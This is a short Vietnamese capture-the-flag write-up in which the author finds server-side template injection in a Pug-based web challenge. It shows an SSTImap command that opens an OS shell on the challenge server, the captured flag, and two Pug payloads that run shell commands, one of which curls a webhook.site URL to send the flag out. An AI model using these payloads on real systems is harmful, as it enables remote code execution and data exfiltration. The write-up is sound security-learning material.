# GREETINGS (WARM UP)

![image](https://hackmd.io/_uploads/SyNyshpYC.png)
Nhìn sơ qua thì challenge chỉ có 1 route này để nhập tên của mình và hiện lên màn hình. Theo kinh nghiệm của mình thì các challenge như vậy sẽ liên quan tới SSTI hoặc là command injection với câu lệnh echo. 

Mình có test thử SSTI trước. Mình thử các engine phổ biến như JinJa2, Velocity, Spring... nhưng mà không có được nên mình thử chạy tool SSTImap. 
Command: `python3 sstimap.py -u http://challs.tfcctf.com:31924/result?username=perryto --os-shell`

![image](https://hackmd.io/_uploads/r1Bw336Y0.png)
Thành công. Thì ra đây là engine của Pug (lạ quá không biết nữa). Test payload `#{7 * 7}` thì được thật. 
![image](https://hackmd.io/_uploads/S1MLhhTKR.png)

Chạy tool thì nó sẽ tự tạo shell cho mình rồi nên không cần gọi reverse shell từ web nữa
Flag: `TFCCTF{a6afc419a8d18207ca9435a38cb64f42fef108ad2b24c55321be197b767f0409}`

P/s: 
1. `#{global.process.mainModule.constructor._load("child_process").execSync("cat flag.txt").toString()}`
2. `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl https://webhook.site/<id>/?c=$(cat flag.txt | base64 | tr -d "\n")')}()}`
